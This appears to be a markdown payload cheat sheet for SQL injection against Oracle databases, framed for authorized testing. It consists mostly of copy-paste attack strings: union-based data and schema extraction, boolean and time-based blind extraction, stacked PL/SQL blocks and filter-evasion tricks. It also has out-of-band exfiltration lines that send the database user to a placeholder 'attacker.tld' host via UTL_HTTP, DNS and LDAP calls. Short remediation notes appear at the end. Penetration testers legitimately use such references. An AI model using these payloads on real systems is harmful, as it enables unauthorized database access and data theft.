@@ -1,0 +1,197 @@
+---
+Vulnerability: SQLi
+Category: Payload
+DB: Oracle
+---
+# Oracle Database — SQLi Payloads
+
+> Copy‑paste ready snippets for **authorized** testing on Oracle (11g → 23c). Adjust quoting, column counts, and block styles. Prefer minimal, non‑destructive proofs. Remember: Oracle often needs `FROM dual` and favors **PL/SQL blocks** for side‑effects.
+
+==============================
+0) Conventions
+==============================
+- Trailing comments: `--` or `/* ... */`.
+- Statement separator in PL/SQL: `;` within `BEGIN ... END;` blocks.
+- Placeholders:
+  - `<C>` = number of columns in the original SELECT.
+  - `<P>` = index of a printable (reflected) column.
+  - `<marker>` = unique token (e.g., `q9xZ2025`).
+- Concat: `||`. Cast to text with `TO_CHAR(...)`.
+- Alternative quoting for complex strings: `q'[ ... ]'`.
+
+==============================
+1) Injection Sanity Checks
+==============================
+String context probes
+```
+'
+'-- -
+')-- -
+"-- +
+```
+Numeric context probes
+```
++1
+-1
+1/0   -- confirms error surface if executed verbatim (ORA-01476)
+```
+
+==============================
+2) Boolean Toggles (Blind baseline)
+==============================
+```
+' AND 1=1 -- -
+' AND 1=2 -- -
+```
+
+==============================
+3) Column Count Discovery (Union path)
+==============================
+`ORDER BY` method (increase until error)
+```
+' ORDER BY 5 -- -
+```
+NULL padding method (with `FROM dual` if selecting constants)
+```
+' UNION ALL SELECT NULL FROM dual -- -
+' UNION ALL SELECT NULL,NULL FROM dual -- -
+' UNION ALL SELECT NULL,NULL,NULL FROM dual -- -
+```
+
+==============================
+4) Find a Printable Column
+==============================
+(Example assumes 3 columns; move the marker across positions; add `FROM dual` for constants)
+```
+' UNION ALL SELECT 1,2,3 FROM dual -- -
+' UNION ALL SELECT 1,'<marker>',3 FROM dual -- -
+' UNION ALL SELECT '<marker>',2,3 FROM dual -- -
+' UNION ALL SELECT 1,2,'<marker>' FROM dual -- -
+```
+
+==============================
+5) Fingerprint & Basics (Union)
+==============================
+(Assume 3 columns, 2nd is printable)
+```
+' UNION ALL SELECT 1,(SELECT banner FROM v$version WHERE ROWNUM=1),3 FROM dual -- -
+' UNION ALL SELECT 1,user,3 FROM dual -- -
+' UNION ALL SELECT 1,SYS_CONTEXT('USERENV','CURRENT_SCHEMA'),3 FROM dual -- -
+```
+
+==============================
+6) Schema Enumeration (Union)
+==============================
+```
+' UNION ALL SELECT 1,owner||':'||table_name,3 FROM all_tables WHERE ROWNUM<=10 -- -
+' UNION ALL SELECT 1,column_name,3 FROM all_tab_columns WHERE table_name='USERS' AND ROWNUM<=50 -- -
+```
+
+==============================
+7) Error‑based (mostly confirmatory)
+==============================
+> Oracle rarely echoes attacker‑controlled data in errors. Use to prove the error surface.
+```
+' AND to_char(1/0) -- -            -- ORA‑01476: divisor is equal to zero
+' AND TO_NUMBER('abc') -- -        -- ORA‑01722: invalid number
+```
+
+==============================
+8) Boolean‑based Extraction
+==============================
+```
+' AND (SELECT SYS_CONTEXT(''USERENV'',''CURRENT_SCHEMA'') FROM dual)='APPDB' -- -
+' AND (SELECT COUNT(*) FROM ALL_TABLES)>10 -- -
+' AND ASCII(SUBSTR((SELECT USER FROM dual),1,1))>77 -- -
+```
+
+==============================
+9) Time‑based Extraction
+==============================
+```
+' AND dbms_lock.sleep(3) -- -
+' AND dbms_pipe.receive_message(''a'',3) -- -
+' AND CASE WHEN (SELECT USER FROM dual)='SYS' THEN dbms_lock.sleep(3) ELSE 0 END=0 -- -
+```
+
+==============================
+10) Stacked Queries / PL‑SQL Blocks
+==============================
+> Use PL/SQL blocks for side‑effects and multi‑step logic.
+```
+'; BEGIN dbms_lock.sleep(3); END;--
+'; DECLARE x VARCHAR2(64); BEGIN SELECT USER INTO x FROM dual; NULL; END;--
+```
+
+==============================
+11) Clause‑Targeted Payloads
+==============================
+`ORDER BY` (identifier injection — fix by allowlisting)
+```
+' ORDER BY 1 -- -
+' ORDER BY CASE WHEN (SELECT USER FROM dual)='SYS' THEN 1 ELSE 2 END -- -
+```
+Pagination (12c+)
+```
+' ORDER BY 1 OFFSET 0 ROWS FETCH NEXT 1 ROWS ONLY -- -
+```
+Legacy pagination
+```
+' AND ROWNUM=1 -- -
+```
+
+==============================
+12) Out‑of‑Band (OOB) — ACL‑dependent
+==============================
+> Subject to **Network ACLs**. Use only with explicit permission.
+```
+' BEGIN UTL_HTTP.REQUEST(''http://attacker.tld/p?u=''||USER); END;--
+' SELECT UTL_INADDR.GET_HOST_ADDRESS(USER||''.attacker.tld'') FROM dual -- -
+' BEGIN DBMS_LDAP.INIT(''attacker.tld'',389); END;--
+```
+
+==============================
+13) No‑quotes Builders (evade filters)
+==============================
+```
+' UNION ALL SELECT 1,CHR(113)||CHR(57)||CHR(120)||CHR(90),3 FROM dual -- -   -- "q9xZ"
+' UNION ALL SELECT 1,HEXTORAW('7139785A'),3 FROM dual -- -                -- binary; cast as needed
+```
+
+==============================
+14) Evasion & Splitting
+==============================
+```
+dbms_/**/lock.sleep(3)
+q'[UNI/**/ON SEL/**/ECT]'
+```
+
+==============================
+15) Safe Proof Patterns (minimal impact)
+==============================
+```
+-- Boolean flip
+' AND 1=1 -- -
+' AND 1=2 -- -
+
+-- Short time blip
+' AND dbms_pipe.receive_message(''a'',2) -- -
+
+-- Marker echo (Union)
+' UNION ALL SELECT 1,'<marker>',3 FROM dual -- -
+```
+
+==============================
+16) Quick Triage Checklist
+==============================
+- [ ] Context identified (string vs numeric); comment style stabilized
+- [ ] Column count matched; printable column located
+- [ ] DB fingerprinted (version banner, USER, schema)
+- [ ] Proof via boolean/time established
+- [ ] Enumeration limited to necessity; **no bulk dumps**
+
+==============================
+17) Cleanup Reminders
+==============================
+- Revert any changes (temp objects) if created.
+- Hand over fixes: **bind variables**, least‑privilege roles, identifier allowlists, Network ACL lockdown.
